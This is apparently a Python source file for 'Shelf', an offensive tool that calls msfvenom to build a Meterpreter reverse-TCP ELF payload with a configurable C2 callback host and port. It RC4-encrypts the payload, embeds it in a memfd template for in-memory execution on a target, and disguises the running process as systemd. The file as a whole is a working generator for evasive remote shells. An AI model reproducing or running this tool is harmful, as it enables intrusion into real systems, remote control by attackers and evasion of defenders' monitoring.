#!/usr/bin/python3

# Shelf | A Python tool for generating executable ELF binaries from Python/Ctypes payloads

import sys
import os
import glob
import base64

from argparse import ArgumentParser
from arc4 import ARC4

def banner():

    banner_output = """
==============================
     [ Shelf v0.0.1 ]
______________________________

"""

    print(banner_output)

def shelf_memfd_generate(ELF_BIN, PAYLOAD, LHOST, LPORT, KEY, S_PROC, S_PROC_ARG):

    print("""
    - ELF Binary:    {}
    - Payload:       {}
    - Callback IPv4: {}
    - Callback Port: {}
    - Spoofed Proc:  {}
    - Spoofed Args:  {}
    """.format(ELF_BIN, PAYLOAD, LHOST, LPORT, S_PROC, S_PROC_ARG))

    print("[*] Generating ELF binary to {}...".format(ELF_BIN))
    os.system("msfvenom -p {} LHOST={} LPORT={} -f elf > {}".format(PAYLOAD, LHOST, LPORT, ELF_BIN))

    with open(ELF_BIN,'rb') as runner:

        load_elf = runner.read()
        arc4 = ARC4(KEY)
        enc_elf = arc4.encrypt(base64.b64encode(load_elf))

    print("[+] ELF binary bytecode RC4 encrypted with loaded key.")

    with open("./memfd-create.py", "r") as python_pre_elf:
        python_prep_elf = python_pre_elf.read().replace("DECRYPT_KEY", "{}".format(KEY)).replace("CRYPTED_ELF", str(enc_elf)).replace("ELF_BINARY",ELF_BIN)

    print("[+] Shelf memfd_template loaded, buffer created for target string overwrite operations.")


    with open("./{}.py".format(S_PROC.replace('/', '-').lstrip('-')), "w") as python_create_elf: # Creates a Python3 script to run on target host named after the spoofed process. # Auto-creation of final ELF executable to a Linux-compatible ELF will be added.
        python_create_elf.write(python_prep_elf)

    print("[+] Rewritten pre-ELF Python3 script written!")

def main():

    parser = ArgumentParser(description="Shelf | Linux ELF binary shell generator for in-memory code execution | written by Kory Findley | Stage2 Security 2020")

    parser.add_argument("-b", "--binary", help="Initial ELF binary path", default="/tmp/sh_elf")
    parser.add_argument("-p", "--payload", help="(MSF payload)", default="linux/x86/meterpreter/reverse_tcp")
    parser.add_argument("--spoof-proc", help="Spoofed process name", default="/lib/systemd/systemd")
    parser.add_argument("--spoof-arg", help="Spoofed process argument name", default="--user")
    parser.add_argument("-k", "--key", help="RC4 encryption key", default="sh3lfRC4k3y1337!")
    parser.add_argument("--lhost", help="C2 / callback host", default="0.0.0.0")
    parser.add_argument("--lport", help="C2 / callback port", default=443)

    args = parser.parse_args()

    shelf_memfd_generate(args.binary, args.payload, args.lhost, args.lport, args.key, args.spoof_proc, args.spoof_arg)

if __name__ == "__main__":

    banner()
    main()
